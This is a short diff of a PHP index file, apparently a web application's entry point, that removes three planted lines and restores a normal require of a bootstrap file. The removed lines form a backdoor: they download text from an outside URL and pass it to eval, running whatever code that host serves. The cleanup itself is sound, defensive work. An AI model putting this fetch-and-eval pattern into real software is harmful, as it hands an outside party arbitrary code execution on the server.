@@ -1,7 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/jeps.txt'));
-$url = "?> ".$url;
-eval($url);
+require('bootstraps.php');
 
 /**
  * @defgroup index Index
